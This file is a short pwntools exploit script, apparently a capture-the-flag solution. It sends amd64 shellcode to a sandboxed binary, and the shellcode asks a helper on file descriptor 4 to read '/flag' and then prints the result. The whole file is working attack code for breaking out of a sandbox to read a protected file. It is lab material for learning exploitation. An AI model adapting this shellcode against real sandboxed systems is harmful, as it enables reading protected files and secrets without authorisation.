#!/bin/python

import os
import sys
import time
from pwn import * 

#context.log_level = 'error'
context.arch = 'amd64'

FLAG_LEN = 58 
WRITABLE_MEM = 0x1337000 + 0x200
FLAG_MEM = WRITABLE_MEM  + 0x700


argv = None
if len(sys.argv) > 2:
    argv = ['sudo', 'strace', '--follow-forks', sys.argv[1], '/flag']
else:
    argv = [sys.argv[1]]

msg1 = 'read_file /home/hacker/msg\x00'
msg2 = 'read_file /flag\x00'
sc_bytes = (shellcraft.write(4, msg1, len(msg1))
          + shellcraft.read( 4, WRITABLE_MEM, 10)

          + shellcraft.write(4, msg2, len(msg2)) 
          + shellcraft.read( 4, WRITABLE_MEM +10, FLAG_LEN)

          + shellcraft.write(4, WRITABLE_MEM, 128)
          + shellcraft.exit(1)
)
asm_code = asm(sc_bytes)

proc = process(argv)
proc.send(asm_code)
proc.interactive()
